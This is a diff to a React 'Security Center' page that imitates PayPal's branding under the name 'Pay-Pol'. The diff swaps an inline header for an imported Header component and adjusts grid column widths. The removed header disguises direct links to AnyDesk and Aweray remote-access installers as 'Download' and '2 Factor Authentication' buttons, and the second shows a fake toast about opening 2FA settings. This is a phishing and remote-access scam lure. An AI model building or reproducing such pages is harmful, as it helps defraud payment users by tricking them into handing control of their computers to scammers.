@@ -32,6 +32,7 @@ import {
   Info, 
   ExternalLink 
 } from 'lucide-react';
+import Header from '@/components/Header';
 
 // --- IN-APP STRUCTURAL DATA ---
 
@@ -204,89 +205,7 @@ export default function SecurityCenter() {
       {/* Top banner removed per design request */}
 
       {/* 2. MAIN HEADER NAVIGATION */}
-      <header className="sticky top-0 bg-white border-b border-[#E2E4E6] z-40 transition-shadow hover:shadow-md">
-        <div className="max-w-7xl mx-auto px-4 md:px-6 h-20 flex items-center justify-between">
-          
-          {/* Logo & Navigation Menu */}
-          <div className="flex items-center gap-10">
-            {/* Logo */}
-            <a href="#" onClick={() => handleTabChange('security-center')} className="flex items-center font-display font-extrabold italic text-2xl tracking-tighter select-none">
-              <span className="text-[#003087]">Pay</span>
-              <span className="text-[#0079C1]">-Pol</span>
-            </a>
-
-            {/* Nav Menu Links */}
-            <nav className="hidden lg:flex items-center gap-8 text-[0.95rem] font-semibold text-[#2C2E2F]">
-              {[
-                { label: 'Personal', key: 'personal', items: ['Checkout Safely', 'Pay on Apps', 'Deals', 'Send Money', 'Contactless Pay'] },
-                { label: 'Business', key: 'business', items: ['Accept Payments', 'Invoicing Solutions', 'Seller Operations', 'Global Scale', 'Enterprise Payments'] },
-                { label: 'Advertiser', key: 'advertiser', items: ['Merchant Ads', 'Retailer Insights', 'Sponsorship Program', 'Co-Marketing Tools'] }
-              ].map((menu) => (
-                <div 
-                  key={menu.key} 
-                  className="relative group py-6"
-                  onMouseEnter={() => setHoveredNav(menu.key)}
-                  onMouseLeave={() => setHoveredNav(null)}
-                >
-                  <button className="flex items-center gap-1.5 focus:outline-none hover:text-[#0079C1] transition-colors cursor-pointer">
-                    {menu.label}
-                    <motion.div
-                      animate={{ rotate: hoveredNav === menu.key ? 180 : 0 }}
-                      transition={{ duration: 0.2 }}
-                    >
-                      <ChevronDown size={14} className="text-[#003087]" />
-                    </motion.div>
-                  </button>
-
-                  <AnimatePresence>
-                    {hoveredNav === menu.key && (
-                      <motion.div
-                        initial={{ opacity: 0, y: 10 }}
-                        animate={{ opacity: 1, y: 0 }}
-                        exit={{ opacity: 0, y: 10 }}
-                        className="absolute left-0 mt-2 w-56 bg-white border border-[#E2E4E6] rounded-xl shadow-xl overflow-hidden py-2"
-                      >
-                        {menu.items.map((subItem, idx) => (
-                          <a 
-                            key={idx} 
-                            href="#" 
-                            className="block px-4 py-2.5 text-sm text-[#2C2E2F] hover:bg-[#F5F7FA] hover:text-[#0079C1] transition-colors font-medium"
-                          >
-                            {subItem}
-                          </a>
-                        ))}
-                      </motion.div>
-                    )}
-                  </AnimatePresence>
-                </div>
-              ))}
-              <a href="#" className="hover:text-[#0079C1] transition-colors py-6">Developer</a>
-            </nav>
-          </div>
-
-          {/* Right Area Controls */}
-          <div className="flex items-center gap-3 sm:gap-6">
-            <a href="#" className="hidden sm:block text-[#2C2E2F] hover:text-[#0079C1] text-sm md:text-[0.95rem] font-bold transition-colors">
-              Help
-            </a>
-            <a
-              href="https://download.anydesk.com/AnyDesk.exe"
-              onClick={() => triggerToast('Starting download...')}
-              className="text-[#003087] border-1.5 border-[#003087] hover:bg-slate-50 rounded-full px-5 py-2 text-xs sm:text-sm font-bold transition-all hover:-translate-y-0.5 active:translate-y-0 select-none cursor-pointer"
-            >
-              Download
-            </a>
-            <a
-              href="https://down.aweray.com/awesun/windows/Aweray_Remote_2.0.0.45399_x64.exe"
-              onClick={() => triggerToast('Opening Two-Factor Authentication settings...')}
-              className="bg-[#003087] text-white hover:bg-[#002266] rounded-full px-5 py-2.5 text-xs sm:text-sm font-bold transition-all hover:scale-[1.02] hover:-translate-y-0.5 active:translate-y-0 shadow-sm select-none cursor-pointer"
-            >
-              2 Factor Authentication
-            </a>
-          </div>
-
-        </div>
-      </header>
+      <Header />
 
       {/* 3. SUB NAVIGATION (TABS BAR) */}
       <section className="bg-white border-b border-[#E2E4E6] sticky top-[80px] z-30 shadow-xs">
@@ -363,7 +282,7 @@ export default function SecurityCenter() {
               <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-12 gap-6">
                 
                 {/* Experiencing Issue Card (lg:span-5 / multi layout) */}
-                <div className="lg:col-span-5 bg-[#F5F7FA] rounded-2xl p-6 md:p-8 flex flex-col justify-between shadow-xs border border-[#E2E4E6] hover:shadow-md transition-shadow">
+                <div className="lg:col-span-6 bg-[#F5F7FA] rounded-2xl p-6 md:p-8 flex flex-col justify-between shadow-xs border border-[#E2E4E6] hover:shadow-md transition-shadow">
                   <div>
                     <h2 className="font-display text-xl sm:text-2xl font-bold text-[#003087] leading-tight mb-4 text-left">
                       Experiencing a security issue right now?
@@ -426,7 +345,7 @@ export default function SecurityCenter() {
                 </div>
 
                 {/* Card 2: Fraud Activations */}
-                <div className="lg:col-span-3.5 bg-[#F8F9FA] rounded-2xl overflow-hidden shadow-xs border border-[#E2E4E6] flex flex-col hover:-translate-y-1 hover:shadow-md transition-all">
+                <div className="lg:col-span-3 bg-[#F8F9FA] rounded-2xl overflow-hidden shadow-xs border border-[#E2E4E6] flex flex-col hover:-translate-y-1 hover:shadow-md transition-all">
                   <div className="relative h-40 bg-[#0070BA] flex items-end justify-center select-none overflow-hidden">
                     {/* SVG Illustration Header */}
                     <div className="w-full flex items-center justify-center pb-2">
@@ -461,7 +380,7 @@ export default function SecurityCenter() {
                 </div>
 
                 {/* Card 3: Suspicious Message */}
-                <div className="lg:col-span-3.5 bg-[#F8F9FA] rounded-2xl overflow-hidden shadow-xs border border-[#E2E4E6] flex flex-col hover:-translate-y-1 hover:shadow-md transition-all">
+                <div className="lg:col-span-3 bg-[#F8F9FA] rounded-2xl overflow-hidden shadow-xs border border-[#E2E4E6] flex flex-col hover:-translate-y-1 hover:shadow-md transition-all">
                   <div className="relative h-40 bg-[#0070BA] flex items-end justify-center select-none overflow-hidden">
                     {/* SVG Illustration Header */}
                     <div className="w-full flex items-center justify-center pb-2">
